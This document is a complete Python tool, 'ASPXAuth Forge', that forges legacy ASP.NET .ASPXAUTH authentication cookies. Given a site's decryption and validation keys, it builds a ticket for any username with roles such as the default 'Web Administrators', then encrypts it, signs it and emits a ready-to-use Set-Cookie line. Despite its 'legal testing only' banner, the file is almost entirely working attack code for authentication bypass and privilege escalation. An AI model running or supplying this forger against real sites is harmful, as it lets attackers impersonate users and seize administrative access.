#!/usr/bin/env python3
"""
ASPXAuth Forge — generate legacy ASP.NET (Framework 2.0 SP2 style) auth cookies
FOR LEGAL TESTING ONLY. Provide keys you own or are authorized to test.

Requires: Python 3.9+ and 'pycryptodome'
    pip install pycryptodome
"""

import os, sys, hmac, hashlib, struct, binascii, base64, argparse
from datetime import datetime, timedelta, timezone
from Crypto.Cipher import AES

def _die(msg: str, code: int = 2):
    print(f"[!] {msg}", file=sys.stderr)
    sys.exit(code)

def write_7bit_int(n: int) -> bytes:
    b = bytearray()
    v = n & 0xffffffff
    while v >= 0x80:
        b.append((v & 0x7f) | 0x80)
        v >>= 7
    b.append(v & 0x7f)
    return bytes(b)

def write_unicode_string(s: str) -> bytes:
    # 7-bit length of chars, then UTF-16LE bytes
    return write_7bit_int(len(s)) + s.encode("utf-16le")

def datetime_to_ticks(dt: datetime) -> int:
    # .NET ticks since 0001-01-01 (100ns units)
    epoch = datetime(1,1,1)
    delta = dt.replace(tzinfo=None) - epoch
    return int(delta.total_seconds() * 10_000_000)

def serialize_ticket(username: str, version: int, is_persistent: bool, user_data: str,
                     cookie_path: str, lifetime_hours: int) -> bytes:
    issue = datetime.now(timezone.utc)
    expire = issue + timedelta(hours=lifetime_hours)
    issue_ticks  = datetime_to_ticks(issue)
    expire_ticks = datetime_to_ticks(expire)

    buf = bytearray()
    buf.append(0x01)                            # serialization marker
    buf.append(version & 0xFF)                  # ticket version
    buf += struct.pack("<q", issue_ticks)       # issue ticks (LE)
    buf.append(0xFE)                            # spacer
    buf += struct.pack("<q", expire_ticks)      # expiration ticks (LE)
    buf.append(0x01 if is_persistent else 0x00) # isPersistent
    buf += write_unicode_string(username)       # username
    buf += write_unicode_string(user_data)      # userData (roles/groups)
    buf += write_unicode_string(cookie_path)    # cookie path
    buf.append(0xFF)                            # footer
    return bytes(buf)

def pkcs7_pad(b: bytes, block: int = 16) -> bytes:
    pad_len = block - (len(b) % block)
    return b + bytes([pad_len])*pad_len

def encrypt_aes_cbc_zero_iv(plaintext: bytes, key: bytes) -> bytes:
    # Normalizes to 32 bytes for AES-256 (pad/truncate)
    k = bytearray(32)
    k[:min(len(key),32)] = key[:min(len(key),32)]
    zero_iv = bytes(16)
    return AES.new(bytes(k), AES.MODE_CBC, zero_iv).encrypt(pkcs7_pad(plaintext))

def hmac_sha256(data: bytes, key: bytes) -> bytes:
    return hmac.new(key, data, hashlib.sha256).digest()

def build_cookie(
    username: str,
    user_data: str,
    group: str,
    decryption_key: bytes,
    validation_key: bytes,
    version: int = 1,
    is_persistent: bool = False,
    cookie_path: str = "/",
    lifetime_hours: int = 1,
) -> bytes:
    # 1) serialize ticket
    ticket = serialize_ticket(username, version, is_persistent, group, cookie_path, lifetime_hours)
    # 2) internal HMAC over ticket
    inner = hmac_sha256(ticket, validation_key)
    ticket_with_inner = ticket + inner
    # 3) random prefix (32 bytes)
    random_prefix = os.urandom(32)
    # 4) encrypt with AES-CBC and zero IV (legacy compat)
    ciphertext = encrypt_aes_cbc_zero_iv(random_prefix + ticket_with_inner, decryption_key)
    # 5) outer HMAC over ciphertext
    outer = hmac_sha256(ciphertext, validation_key)
    return ciphertext + outer

def parse_hex_key(s: str, name: str) -> bytes:
    try:
        b = binascii.unhexlify(s.strip())
        if len(b) == 0:
            _die(f"{name}: key is empty after decoding")
        return b
    except Exception as e:
        _die(f"{name}: invalid hex ({e})")

def main():
    p = argparse.ArgumentParser(
        prog="aspxauth_forge",
        description="Generate legacy ASP.NET FormsAuth cookies."
    )
    p.add_argument("--username", required=True, help="Username (e.g., bob.w)")
    p.add_argument("--group", default="Web Administrators", help="Group/role in userData")
    p.add_argument("--cookie-path", default="/", help="Cookie path")
    p.add_argument("--version", type=int, default=1, help="Ticket version (default 1)")
    p.add_argument("--persistent", action="store_true", help="Set isPersistent")
    p.add_argument("--lifetime-hours", type=int, default=1, help="Ticket lifetime (hours)")
    p.add_argument("--decryption-key", help="DECRYPTION KEY (hex). If absent, read FORGE_DEC_KEY env")
    p.add_argument("--validation-key", help="VALIDATION KEY (hex). If absent, read FORGE_VAL_KEY env")
    p.add_argument("--out", choices=["hex","base64","both"], default="both", help="Output format")
    p.add_argument("--set-cookie", action="store_true", help="Emit a Set-Cookie header line")
    p.add_argument("--cookie-name", default=".ASPXAUTH", help="Cookie name used when --set-cookie")
    p.add_argument("--roles", help="Comma-separated roles (shorthand). Example: 'Admin,Users'")
    p.add_argument("--user-data", help="Raw userData string to embed in the ticket (overrides --roles).")
    p.add_argument("--dry-run", action="store_true", help="Do everything except emit cookie material")
    args = p.parse_args()

    dec_hex = args.decryption_key or os.getenv("FORGE_DEC_KEY")
    val_hex = args.validation_key or os.getenv("FORGE_VAL_KEY")

    if not dec_hex or not val_hex:
        _die("Missing keys. Provide --decryption-key/--validation-key (hex) or env FORGE_DEC_KEY / FORGE_VAL_KEY")

    dec_key = parse_hex_key(dec_hex, "decryption-key")
    val_key = parse_hex_key(val_hex, "validation-key")

    # Decide user_data value
    if args.user_data is not None:
        user_data = args.user_data
    elif args.roles:
        # Normalize: strip whitespace, join with commas
        role_list = [r.strip() for r in args.roles.split(",") if r.strip()]
        user_data = ",".join(role_list)
    else:
        # default: empty string (safer than giving admin-level access)
        user_data = ""

    cookie_bytes = build_cookie(
        username=args.username,
        user_data=user_data,
        group=args.group,
        decryption_key=dec_key,
        validation_key=val_key,
        version=args.version,
        is_persistent=args.persistent,
        cookie_path=args.cookie_path,
        lifetime_hours=args.lifetime_hours,
    )

    if args.dry_run:
        print("[*] Dry-run complete: ticket built successfully.")
        sys.exit(0)

    # Output
    out_hex = binascii.hexlify(cookie_bytes).decode("ascii").upper()
    out_b64 = base64.b64encode(cookie_bytes).decode()

    if args.out in ("hex","both"):
        print("[HEX]:")
        print(out_hex)
    if args.out in ("base64","both"):
        print("\n[Base64]:")
        print(out_b64)

    if args.set_cookie:
        # Minimal Set-Cookie (HttpOnly/SameSite=Lax by default)
        print("\n[Set-Cookie]:")
        print(f"{args.cookie_name}={out_b64}; Path={args.cookie_path}; HttpOnly; SameSite=Lax")

if __name__ == "__main__":
    main()

